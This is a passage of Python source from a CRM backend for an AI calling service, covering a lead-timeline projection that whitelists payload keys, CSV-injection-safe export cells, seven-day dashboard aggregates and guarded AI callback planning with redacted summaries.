#                                             Never a name — see `update_lead`.
#   type=note           ingest.service._timeline (kind='blocked')
#       {kind, rule}                          `rule` is a compliance-gate rule NAME
#                                             (`dnc`, `calling_hours`), authored by us.
#   type=call           ingest.service._timeline (kind='call')
#       {kind, engine_call_id}                the ENGINE's handle for the dial — a
#                                             vendor identifier (hard rule 2), so it is
#                                             read and deliberately not emitted.
#   type=call           workers.pipeline._upsert_lead
#       {call_id, status}                     our call id + our call-status enum.
#   type=notification   workers.notifications._record_attempt
#       {call_id, channel, delivered, attempts, triggers}
#                                             `triggers` are hot-lead RULE names.
#   type=notification   workers.whatsapp._record_attempt
#       {call_id, channel, delivered, status, reason, template, attempts, triggers}
#   type=notification   workers.whatsapp._record_escalation_attempt
#       {channel, kind, campaign_id, contact_id, delivered, status, reason, template,
#        attempts}                            `reason` is an AUTHORED code and says so
#                                             at `SendResult.reason` ("never vendor
#                                             prose — a provider error string is
#                                             untrusted text that may quote the payload
#                                             we just sent it").
#
# So: no producer stores a phone number, transcript text or an extraction payload
# TODAY. That is a fact about six functions, not a property of a schemaless column, and
# hard rules 5 and 6 have to hold for the seventh. The projection is therefore a
# whitelist of KEYS, and `_code` is a second gate on the VALUES.

# What an authored code looks like: snake_case, ASCII, bounded. Free prose — the shape
# that could carry a caller's words or a vendor's echo — has capitals, spaces or
# punctuation and does not match, so a producer that one day writes an error MESSAGE
# where its siblings write an error CODE degrades to "no detail" instead of to a leak.
_AUTHORED_CODE = re.compile(r"\A[a-z][a-z0-9_]{0,63}\Z")

# How many timeline rows one request may take. A lead that has been called weekly for a
# year has ~50 events; the cap exists so a pathological row count cannot turn one page
# view into an unbounded read, and the response states `total` so the screen can say
# what it is a page OF rather than implying it holds everything.
MAX_TIMELINE_PAGE = 100

# The channel a notification went out on, in the client's words. Falls back to the
# stored code rather than to silence: an unrecognised channel is a channel we shipped
# and forgot to name here, and hiding the row would hide "we tried to tell you".
_CHANNEL_LABELS = {"email": "email", "whatsapp": "WhatsApp"}


def _code(payload: dict[str, Any], key: str) -> str | None:
    """A payload value that LOOKS like the authored code its producer promised."""
    value = payload.get(key)
    return value if isinstance(value, str) and _AUTHORED_CODE.match(value) else None


def _timeline_uuid(payload: dict[str, Any], key: str) -> UUID | None:
    """A payload value that is one of OUR ids, or nothing. A key holding anything else
    — including a phone number, which is what this guard is really for — is dropped."""
    value = payload.get(key)
    if not isinstance(value, str):
        return None
    try:
        return UUID(value)
    except ValueError:
        return None


def _project_event(
    event_type: str, payload: dict[str, Any], member_names: dict[UUID, str | None]
) -> tuple[str, str | None, UUID | None]:
    """`(title, detail, call_id)` for one row — the ONLY place a payload is read.

    Everything returned is either prose written here or a value that passed `_code` /
    `_timeline_uuid`. Nothing is passed through, and an event this build does not
    recognise gets an honest, contentless line rather than being dropped: a client
    reading their own history must not silently lose a row because we shipped a
    producer before we shipped its copy (`attention.BLOCK_REMEDIES` makes the same
    choice for a rule whose remedy has not been written yet).
    """
    if event_type == "status_change":
        status = _code(payload, "status")
        return (f"Moved to {status}" if status else "Status changed", None, None)

    if event_type == "assignment":
        owner = _timeline_uuid(payload, "assigned_to")
        if owner is None:
            return ("Owner removed", "This lead is unassigned.", None)
        name = member_names.get(owner)
        return (
            f"Assigned to {name}" if name else "Assigned",
            None if name else "The owner is no longer on this account.",
            None,
        )

    if event_type == "call":
        # Two producers, two shapes. The pipeline's row names OUR call, so the screen
        # can link to it; the ingest row names only the engine's handle, which is a
        # vendor identifier and stays inside the engine boundary (hard rule 2).
        call_id = _timeline_uuid(payload, "call_id")
        status = _code(payload, "status")
        if call_id is None:
            return ("Call placed", None, None)
        return (f"Call {status}" if status else "Call", None, call_id)

    if event_type == "note":
        if _code(payload, "kind") == "blocked":
            # The SAME copy deck the needs-attention queue renders, so a client reading
            # "why was this not called?" in two places is told one thing. Imported at
            # module scope again: this was a function-local import only because
            # `crm.attention` imported `mask_phone` from here, and that function is gone.
            rule = _code(payload, "rule") or "unknown"
            return (
                "Call blocked",
                BLOCK_REMEDIES.get(rule, f"Blocked by the {rule} rule."),
                None,
            )
        return ("Note", None, None)

    if event_type == "notification":
        channel_code = _code(payload, "channel")
        channel = _CHANNEL_LABELS.get(channel_code or "", channel_code or "a message")
        escalation = _code(payload, "kind") == "campaign_escalation"
        what = "Follow-up message" if escalation else "Hot-lead alert"
        delivered = payload.get("delivered") is True
        if delivered:
            return (f"{what} sent by {channel}", None, _timeline_uuid(payload, "call_id"))
        attempts = payload.get("attempts")
        tries = f" after {attempts} attempt(s)" if isinstance(attempts, int) else ""
        reason = _code(payload, "reason")
        return (
            f"{what} not sent by {channel}",
            f"We could not deliver it{tries}." + (f" ({reason})" if reason else ""),
            _timeline_uuid(payload, "call_id"),
        )

    # A type the database allows and this build does not know — the state a deploy
    # sitting behind its own migration is in. `LeadTimelineEventOut.type` is a plain
    # string for exactly this, so the row still reaches the screen with its timestamp
    # and its actor, and the screen renders it under a neutral icon.
    return ("Activity", None, None)


async def _member_names(session: AsyncSession, user_ids: set[UUID]) -> dict[UUID, str | None]:
    """Display names for ids that belong to THIS tenant's team, and nothing else.

    Through `memberships` (force-RLS'd) rather than `users` (global, no RLS), so an id
    from another tenant — or one that was never a member — resolves to no entry and the
    projection says "no longer on this account" instead of naming a stranger. Resolved
    as one `= ANY(...)` after the page is fetched rather than as a join on `actor::text`
    inside it: the cast join is unindexable and would be evaluated before the LIMIT.
    """
    if not user_ids:
        return {}
    rows = (
        await session.execute(
            text(
                "SELECT m.user_id, u.name FROM memberships m JOIN users u ON u.id = m.user_id "
                "WHERE m.user_id = ANY(:ids)"
            ),
            {"ids": list(user_ids)},
        )
    ).all()
    return {UUID(str(row[0])): row[1] for row in rows}


async def lead_timeline(
    session: AsyncSession, lead_id: UUID, *, limit: int = 50, offset: int = 0
) -> LeadTimelineOut:
    """Everything that happened to one lead, newest first.

    The record already existed — "we called them twice, the WhatsApp was refused, the
    campaign gave up" is written by six producers — and no client could read it. This is
    that read, and it is a READ: `leads:read`, no audit row, nothing mutated.

    The lead's existence is probed separately from its events, because zero events is a
    legitimate answer for a lead nobody has touched and a missing lead is a 404. Under
    RLS both probes are already tenant-scoped, so another tenant's lead id is a 404 and
    not an empty timeline — the same answer `ProblemError.not_found` gives everywhere
    else, and deliberately indistinguishable from a lead that never existed.
    """
    exists = (
        await session.execute(
            text("SELECT 1 FROM leads WHERE id = :lid AND deleted_at IS NULL"), {"lid": lead_id}
        )
    ).first()
    if exists is None:
        raise ProblemError.not_found("Lead")

    rows = (
        await session.execute(
            text(
                "SELECT id, type, payload, actor, created_at, count(*) OVER () AS matching "
                "FROM lead_events WHERE lead_id = :lid "
                # `id DESC` for the same reason the leads list carries it: several rows
                # of one post-call pipeline run share `created_at`, and OFFSET over a
                # non-total order shows one row twice and another never.
                "ORDER BY created_at DESC, id DESC LIMIT :limit OFFSET :offset"
            ),
            {"lid": lead_id, "limit": min(limit, MAX_TIMELINE_PAGE), "offset": offset},
        )
    ).all()

    # Every id this page might have to NAME, resolved in one query: the person who acted
    # and, for an assignment, the person acted upon.
    wanted: set[UUID] = set()
    for row in rows:
        actor = _actor_uuid(row[3])
        if actor is not None:
            wanted.add(actor)
        if row[1] == "assignment":
            target = _timeline_uuid(row[2] or {}, "assigned_to")
            if target is not None:
                wanted.add(target)
    names = await _member_names(session, wanted)

    items: list[LeadTimelineEventOut] = []
    for row in rows:
        payload: dict[str, Any] = row[2] or {}
        title, detail, call_id = _project_event(str(row[1]), payload, names)
        actor = _actor_uuid(row[3])
        items.append(
            LeadTimelineEventOut(
                id=row[0],
                type=str(row[1]),
                occurred_at=row[4],
                actor_kind="member" if actor is not None else "system",
                actor_name=names.get(actor) if actor is not None else None,
                title=title,
                detail=detail,
                call_id=call_id,
            )
        )
    return LeadTimelineOut(
        items=items,
        # The size of the SET, from the same pass as the rows (`count(*) OVER ()` is
        # evaluated after WHERE and before LIMIT). Never `len(items)`, which is the size
        # of the page — the distinction BUILD-LOG §52 records four defects for.
        total=int(rows[0].matching) if rows else 0,
        limit=min(limit, MAX_TIMELINE_PAGE),
        offset=offset,
    )


def _actor_uuid(actor: Any) -> UUID | None:
    """`lead_events.actor` as a member id, or None for the platform.

    The column is free TEXT: the workers write the literal `'system'` and the API writes
    `str(principal.user_id)`. Anything that does not parse as a UUID is treated as the
    platform rather than as a person, which is the fail-safe direction — an unparseable
    actor rendered as "a colleague" would put a person's name on something nobody did.
    """
    if not isinstance(actor, str):
        return None
    try:
        return UUID(actor)
    except ValueError:
        return None


def _csv_value(value: Any) -> str:
    """Render ONE cell of the export a client opens in Excel — any column, any type.

    DISARMED, because the values here are caller-supplied — a name a caller dictated or
    a web form posted, a business, a note the agent transcribed — and a cell beginning
    `=`, `+`, `-` or `@` executes on open. The Sheets writer has guarded the
    byte-identical value since D-23; this path did not, and it is the one a human
    double-clicks. `core.spreadsheet_safety` holds the shared leader set, the reason the
    two paths render the fix differently, and the OWASP sources.

    It renders the whole row rather than the extraction fields alone for the reason the
    caller states: a renderer that covers some columns is a renderer whose next column
    is unguarded, and that is exactly how `name` came to sit raw beside disarmed cells.
    `datetime` is spelled out rather than left to `str()` so the export keeps its
    ISO-8601 `T` separator — `str(datetime)` writes a space, and that is a format change
    hiding inside a security fix.
    """
    if value is None:
        return ""
    if isinstance(value, bool):  # bool before int — it is a subclass
        return "yes" if value else "no"
    if isinstance(value, datetime):
        return disarm_for_csv(value.isoformat())
    return disarm_for_csv(str(value))


# --- dashboard ----------------------------------------------------------------

DASHBOARD_DAYS = 7

# status → the class the 7-day chart counts it in. A PARTITION of
# `crm.models.CALL_STATUSES`: every status the CHECK constraint allows appears in
# exactly one class, which is what makes the four counts add to the bucket total.
# `DashboardDayOut` holds the reasoning for each class and names the UI colours it
# matches; `tests/dashboard_daily_test.py::test_the_classes_partition_...` is what
# stops a ninth status from silently unbalancing every bucket.
DAILY_CALL_CLASSES: dict[str, tuple[str, ...]] = {
    "completed": ("completed",),
    "no_answer": ("no_answer", "busy", "voicemail"),
    "failed": ("failed",),
    "in_flight": ("queued", "ringing", "in_progress"),
}

# `= ANY(:param)` rather than this module's usual `IN {TUPLE!r}` interpolation: `repr`
# of a ONE-element tuple carries a trailing comma, and `IN ('completed',)` is a SQL
# syntax error. A bound array parameter is arity-proof and needs no quoting rules.
_DAILY_CLASS_COUNTS_SQL = ", ".join(
    f"count(r.status) FILTER (WHERE r.status = ANY(:class_{name})) AS {name}"
    for name in DAILY_CALL_CLASSES
)

# The 7-day series, zero-filled, in ONE round trip. `generate_series` over the days is
# the boring documented answer to "a bucket per day whether or not it has rows", and
# the LEFT JOIN is what keeps a silent day at zero instead of absent.
#
# `count(r.status)`, never `count(*)`: on the unmatched side of a LEFT JOIN `count(*)`
# counts the day row itself and scores an empty day as 1. `calls.status` is NOT NULL,
# so counting it counts matched calls and nothing else.
#
# The `recent` bound is a plain comparison against the raw timestamptz, not against the
# IST day: `calls` today carries no index on `started_at` (the tenant policy's
# `ix_calls_tenant_id` is what bounds this scan, as it does for every other aggregate in
# this function), but a predicate written as a function of the column could not use one
# if it ever landed, and this one can.
#
# 8 days is a deliberate SUPERSET of the 7-day window, not an off-by-one: the oldest
# bucket opens at IST midnight six days back, which is at most 6d23h59m before `now()`,
# so a 7-day bound could clip it and 8 cannot. The day join discards the surplus.
_DAILY_7D_SQL = f"""
WITH days AS (
    SELECT {IST_TODAY_SQL} - days_back AS ist_date
    FROM generate_series({DASHBOARD_DAYS - 1}, 0, -1) AS days_back
),
recent AS (
    SELECT status, {IST_DAY_SQL} AS ist_date
    FROM calls
    WHERE started_at >= now() - interval '{DASHBOARD_DAYS + 1} days'
)
SELECT d.ist_date, count(r.status) AS total, {_DAILY_CLASS_COUNTS_SQL}
FROM days d LEFT JOIN recent r ON r.ist_date = d.ist_date
GROUP BY d.ist_date
ORDER BY d.ist_date
"""


async def dashboard(session: AsyncSession) -> DashboardOut:
    """One round trip per tile would be four round trips; these are cheap aggregates
    over an already tenant-scoped view, and the dashboard polls (D-24).

    **The after-hours tile prefers the client's own hours.** FLOWS §3 specifies the
    `after_hours` flag as derived from `agents.business_hours`; until the intake step
    landed there was nothing in that column, so this counted a hardcoded 09:00-21:00
    IST window instead. That window is right only for a client who happens to keep
    those hours and wrong in both directions otherwise — it misses the late-night
    clinic's 22:30 enquiry entirely and files every Sunday walk-in at the
    Sunday-closed salon as business as usual.

    The hardcoded window survives as a FALLBACK rather than being deleted, because a
    client who has not done the intake yet would otherwise watch a working tile drop to
    zero and read it as calls being lost. What is new is that the response says which
    of the two it is (`after_hours_basis`), so the number is never silently a guess
    wearing the clothes of a fact.

    **The 7-day chart series is one query, not seven.** `daily_7d` joins a
    `generate_series` of the seven IST calendar days against the calls in that window,
    so an empty day comes back as a zero bucket from the same pass that counts the busy
    ones. Seven dated round trips would have been the same rows read seven times and
    would still have needed the zero-fill written by hand.
    """
    since_7d = datetime.now(UTC) - timedelta(days=7)
    today = datetime.now(UTC).date()

    # THE WINDOW IS ON THE STATEMENT NOW, not on three of its four columns (D-215).
    #
    # `avg_duration` was the one aggregate here with no time bound — `avg(duration_s)
    # FILTER (WHERE status = 'completed')` over the account's WHOLE history, on an
    # endpoint the dashboard polls (D-24), against a table nothing ever deletes from. No
    # index can help an aggregate that must visit every row, so the tile's cost grew with
    # the client's lifetime: 27.2 ms / 1,017 buffers at 45,000 calls, and linear from
    # there forever.
    #
    # The fix is a window, and a window REDEFINES a number the client reads, so it is
    # said out loud in three places rather than slipped in: the response field is
    # `avg_duration_s_7d`, the tile's hint says "last 7 days", and this comment says why
    # seven.
    #
    # WHY SEVEN AND NOT THIRTY. Every other bounded number on this screen is seven days —
    # `calls_7d`, `leads_new_7d`, `after_hours_captured_7d`, the `daily_7d` chart — and
    # `DashboardOut` already spells the window into each of those NAMES. A 30-day average
    # sitting between a 7-day call count and a 7-day chart would be a fourth window on a
    # screen that already carries three (today, 7 days, this month), and close enough to
    # "this month" to be read as it. The thirty-day reading of this exact statistic
    # already exists one screen over and is already bounded: `performance()` takes `days`
    # (default 30) and returns `avg_duration_s` beside the window that produced it. Two
    # windows on two screens, each labelled, is one answer per question; a second
    # unlabelled average would be two answers to one.
    #
    # Once every term is inside seven days the WHOLE statement takes the bound and
    # `ix_calls_tenant_started` (D-206) serves it: 27.2 ms / 1,017 buffers → 0.84 ms /
    # 61 buffers on the same tenant. `calls_today` is unchanged by the move (today is a
    # subset of the last seven days) and `calls_7d` stops needing a FILTER, because the
    # statement is now the filter.
    counts = (
        await session.execute(
            text(
                "SELECT "
                "  count(*) FILTER (WHERE started_at::date = :today) AS calls_today, "
                "  count(*) AS calls_7d, "
                "  avg(duration_s) FILTER (WHERE status = 'completed') AS avg_duration, "
                # IST by name, not by a fixed offset: EXTRACT on a timestamptz renders
                # it in the session's TimeZone, so `+ interval '5:30'` is only IST on a
                # database that happens to be set to UTC (same fix as performance.py).
                "  count(*) FILTER ("
                f"     WHERE {IST_HOUR_SQL} < 9 OR {IST_HOUR_SQL} >= 21"
                "  ) AS after_hours "
                "FROM calls WHERE started_at >= :since"
            ),
            {"today": today, "since": since_7d},
        )
    ).first()

    sentiment = (
        await session.execute(
            text(
                "SELECT sentiment, count(*) FROM calls WHERE sentiment IS NOT NULL "
                "AND started_at >= :since GROUP BY sentiment"
            ),
            {"since": since_7d},
        )
    ).all()
    outcome = (
        await session.execute(
            text(
                "SELECT outcome_tag, count(*) FROM calls WHERE outcome_tag IS NOT NULL "
                "AND started_at >= :since GROUP BY outcome_tag"
            ),
            {"since": since_7d},
        )
    ).all()
    leads = (
        await session.execute(
            text(
                "SELECT count(*) FILTER (WHERE created_at >= :since) AS new_leads, "
                "count(*) FILTER (WHERE status = 'hot') AS hot_open "
                "FROM leads WHERE deleted_at IS NULL"
            ),
            {"since": since_7d},
        )
    ).first()
    daily = (
        await session.execute(
            text(_DAILY_7D_SQL),
            {f"class_{name}": list(statuses) for name, statuses in DAILY_CALL_CLASSES.items()},
        )
    ).all()
    # `spend_state` holds ONE row per tenant (PK `tenant_id`), stamped with the billing
    # month its counters belong to and reset by the meter on rollover — so "minutes used
    # this month" is a question about the stamp as much as about the number. This tile
    # carried a copy of the query with no month predicate, which is the pre-fix reader
    # the gate, the admin directory and the health panel have all since dropped: an
    # outbound-only tenant that has not metered yet in the new month was shown LAST
    # month's minutes as this month's usage — on the dashboard, beside a call count that
    # correctly said zero.
    #
    # `read_spend_counters` is the ONE month-aware reader (`billing/caps.py`), and a
    # stale or absent row reads as zero there rather than as null: "we have no counter"
    # and "the counter says nothing was used" are the same fact to a client, and this
    # field has always been a number when a row existed.
    counters = await read_spend_counters(session, tenant_id=await session_tenant(session))

    # One cheap existence check decides which definition the tile is entitled to. It is
    # asked of `agents` rather than inferred from the count above, because "no agent has
    # hours" and "hours are recorded and nothing fell outside them" are different facts
    # that both produce zero.
    has_hours = bool(
        (
            await session.execute(
                text("SELECT 1 FROM agents WHERE business_hours IS NOT NULL LIMIT 1")
            )
        ).scalar()
    )
    if has_hours:
        after_hours = await count_after_hours_calls(session, since=since_7d)
        after_hours_basis: Literal["business_hours", "default_window"] = "business_hours"
    else:
        after_hours = int(counts[3] or 0) if counts else 0
        after_hours_basis = "default_window"

    return DashboardOut(
        calls_today=int(counts[0] or 0) if counts else 0,
        calls_7d=int(counts[1] or 0) if counts else 0,
        avg_duration_s_7d=int(counts[2]) if counts and counts[2] is not None else None,
        after_hours_captured_7d=after_hours,
        after_hours_basis=after_hours_basis,
        sentiment_split={row[0]: int(row[1]) for row in sentiment},
        outcome_split={row[0]: int(row[1]) for row in outcome},
        leads_new_7d=int(leads[0] or 0) if leads else 0,
        hot_leads_open=int(leads[1] or 0) if leads else 0,
        minutes_used_month=counters.minutes_used,
        # Named columns rather than positional: six of them, and a chart that swaps
        # `failed` for `no_answer` is wrong in a way nobody reading it would notice.
        daily_7d=[
            DashboardDayOut(
                ist_date=row.ist_date,
                total=int(row.total),
                completed=int(row.completed),
                no_answer=int(row.no_answer),
                failed=int(row.failed),
                in_flight=int(row.in_flight),
            )
            for row in daily
        ],
    )


# D-21 M2: a callback is a call whose reason is another call. Both numbers below are
# deliberately conservative, and both are about the person being rung rather than about
# us: three chained callbacks is already a robot that has phoned someone three times
# about one enquiry, and a follow-up a fortnight later is a cold call wearing a
# follow-up's clothes.
MAX_CALLBACK_DEPTH = 2
CALLBACK_WINDOW_DAYS = 7
# Outcomes a callback makes sense for. `resolved` is excluded on purpose: the whole
# point of recording an outcome is that we then act differently on it.
CALLBACK_OUTCOMES: tuple[OutcomeTag, ...] = ("needs_follow_up", "dropped")
CALLBACK_STATUSES: tuple[CallStatus, ...] = ("no_answer", "busy", "voicemail", "completed")


@dataclass(frozen=True, slots=True)
class CallbackPlan:
    """Everything the dispatch needs, plus the reason it is allowed."""

    lead_id: UUID
    agent_id: UUID
    phone_e164: str
    lead_name: str | None
    context_note: str
    depth: int


async def plan_callback(session: AsyncSession, call_id: UUID) -> CallbackPlan:
    """Decide whether this call may be followed up, and with what context.

    Refuses by NAMED rule rather than a bare 422, for the same reason the campaign
    launch gate does: the button needs to explain itself (SURFACES §2b).

    The context handed to the agent is OUR summary, never the transcript. A transcript
    is the most sensitive artefact we hold; a summary is what a human colleague would
    be told before picking up the phone, and it is what the extraction step already
    produced and the client already reads.

    REDACTED, and this one leaves the building twice. The note is rendered into the
    outbound agent's prompt, so it goes to the engine as text and can then come out of
    the AI's mouth on the phone: an unredacted summary is how a follow-up call ends up
    reading a caller's own Aadhaar back to them. SEC-COMP §4 puts redaction before
    anything transcript-derived leaves us, and the two other outbound uses of this
    column — the `call.completed` webhook and the hot-lead notification — already do
    this. Nothing worth saying to the agent is lost: the person it is about to ring is
    the person whose number would have been in there.
    """
    row = (
        await session.execute(
            text(
                "SELECT c.lead_id, c.agent_id, c.status, c.outcome_tag, c.summary, "
                "  c.created_at, c.callback_of_call_id, l.phone_e164, l.name, a.direction "
                "FROM calls c "
                "LEFT JOIN leads l ON l.id = c.lead_id "
                "JOIN agents a ON a.id = c.agent_id "
                "WHERE c.id = :cid"
            ),
            {"cid": call_id},
        )
    ).first()
    if row is None:
        raise ProblemError.not_found("Call")
    (
        lead_id,
        agent_id,
        status,
        outcome,
        summary,
        created_at,
        parent,
        phone,
        lead_name,
        direction,
    ) = row

    if lead_id is None or phone is None:
        raise ProblemError.business_rule(
            "callback_no_lead",
            "This call is not linked to a lead, so there is no one to call back.",
        )
    if status not in CALLBACK_STATUSES:
        raise ProblemError.business_rule(
            "callback_call_unfinished",
            "This call has not finished yet.",
            remediation="Wait for the call to end, then try again.",
        )
    if status == "completed" and outcome not in CALLBACK_OUTCOMES:
        raise ProblemError.business_rule(
            "callback_not_needed",
            f"This call was marked {outcome or 'resolved'}, so no follow-up is due.",
        )
    if direction == "inbound":
        # The agent that ANSWERS is not necessarily configured to place calls, and
        # dispatching through it would fail at the gate anyway — say so here instead.
        raise ProblemError.business_rule(
            "callback_agent_inbound_only",
            "This agent only answers calls; it cannot place a callback.",
        )

    age_days = (datetime.now(UTC) - created_at).days if created_at else 0
    if age_days > CALLBACK_WINDOW_DAYS:
        raise ProblemError.business_rule(
            "callback_too_old",
            f"This call was {age_days} days ago; a follow-up now would read as a cold call.",
            remediation="Call the lead directly from the Leads table instead.",
        )

    depth = 0
    cursor = parent
    while cursor is not None and depth < 10:
        depth += 1
        cursor = (
            await session.execute(
                text("SELECT callback_of_call_id FROM calls WHERE id = :cid"), {"cid": cursor}
            )
        ).scalar()
    if depth >= MAX_CALLBACK_DEPTH:
        raise ProblemError.business_rule(
            "callback_chain_exhausted",
            "We have already followed up on this conversation twice.",
            remediation="A person should make the next call.",
        )

    safe_summary = redacted_summary(str(summary).strip()) if summary else None
    note = (
        f"This is a follow-up to an earlier call. What happened last time: {safe_summary}"
        if safe_summary
        else "This is a follow-up to an earlier call that ended without a resolution."
    )
    return CallbackPlan(
        lead_id=UUID(str(lead_id)),
        agent_id=UUID(str(agent_id)),
        phone_e164=str(phone),
        lead_name=lead_name,
        context_note=note,
        depth=depth,
    )


async def link_callback(session: AsyncSession, *, handle: str, parent_call_id: UUID) -> None:
    """Stamp the new call as a follow-up of the old one, by engine handle.

    Separate from `dispatch_call` on purpose: that function is the ONE outbound entry
    point and must not grow a parameter per caller (D-21 button, campaigns, webhooks).
    """
    await session.execute(
        text(
            "UPDATE calls SET callback_of_call_id = :parent, updated_at = now() "
            "WHERE engine_call_id = :handle"
        ),
        {"parent": parent_call_id, "handle": handle},
    )


__all__ = [
    "CALLBACK_OUTCOMES",
    "DAILY_CALL_CLASSES",
    "DASHBOARD_DAYS",
    "FACET_QUERY_COST_MS",
    "FACET_RAIL_BUDGET_MS",
    "LEAD_STATUSES",
    "MAX_CALLBACK_DEPTH",
    "MAX_EXPORT_ROWS",
    "MAX_FACET_FIELDS",
    "MAX_FACET_VALUES",
    "MAX_PAGE",
    "MAX_TIMELINE_PAGE",
    "AssigneeChange",
    "CallbackPlan",
    "Facet",
    "FacetSet",
    "FacetValue",
    "FieldFilters",
    "LeadExport",
    "LeadPage",
    "RecordingRef",
    "dashboard",
    "emit_lead_updated",
    "export_leads_csv",
    "get_call",
    "get_lead",
    "lead_columns",
    "lead_facets",
    "lead_phone",
    "lead_timeline",
    "leads_ranked_by_id",
    "link_callback",
    "list_calls",
    "list_leads",
    "list_leads_page",
    "plan_callback",
    "recording_ref_for",
    "redacted_summary",
    "set_lead_name",
    "update_lead",
]
